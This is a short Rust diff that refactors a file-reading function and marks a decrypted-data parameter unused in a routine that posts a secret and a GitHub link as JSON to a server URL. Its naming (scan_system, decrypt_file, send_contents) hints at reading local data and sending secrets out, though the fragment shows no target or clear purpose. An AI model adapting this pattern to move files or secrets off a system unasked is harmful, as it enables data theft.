@@ -7,9 +7,10 @@ use aes::cipher::generic_array::GenericArray;
 use reqwest::{Client, StatusCode};
 use serde_json::json;
 
-pub async fn scan_system(file_path: &str) -> Result<Vec<u8>, io::Error> {
-    let file = File::open(file_path)?;
-    let mut buf_reader = BufReader::new(file);
+pub async fn scan_system<R>(mut buf_reader: BufReader<R>) -> Result<Vec<u8>, io::Error>
+where
+    R: Read,
+{
     let mut contents = Vec::new();
     buf_reader.read_to_end(&mut contents)?;
     Ok(contents)
@@ -32,7 +33,7 @@ pub fn decrypt_file(encrypted_data: &[u8], key: &[u8]) -> Vec<u8> {
     decrypted_data
 }
 
-pub async fn send_contents(decrypted_data: Vec<u8>, server_url: &str, parsed_secret: &[u8], github_link: &str) -> Result<(), reqwest::Error> {
+pub async fn send_contents(_decrypted_data: Vec<u8>, server_url: &str, parsed_secret: &[u8], github_link: &str) -> Result<(), reqwest::Error> {
     let client = Client::new();
     let json_body = json!({
         "message": parsed_secret,
